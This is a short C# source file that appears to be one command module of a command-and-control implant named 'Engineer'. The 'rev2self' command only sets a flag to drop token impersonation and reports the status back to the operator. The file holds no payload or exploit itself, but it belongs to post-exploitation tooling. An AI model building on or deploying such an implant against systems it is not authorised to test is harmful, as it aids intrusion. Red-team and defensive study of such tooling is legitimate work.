using System.Diagnostics;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class Rev2Self : EngineerCommand
    {
        public override string Name => "rev2self";

        public override async Task Execute(EngineerTask task)
        {
            {
                Program.RevertedToSelf = true;
                string result = "Dropped impersonation, reverted to previous user";
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(result, task, EngTaskStatus.Complete, TaskResponseType.String);
                return;
            }
        }
    }
}
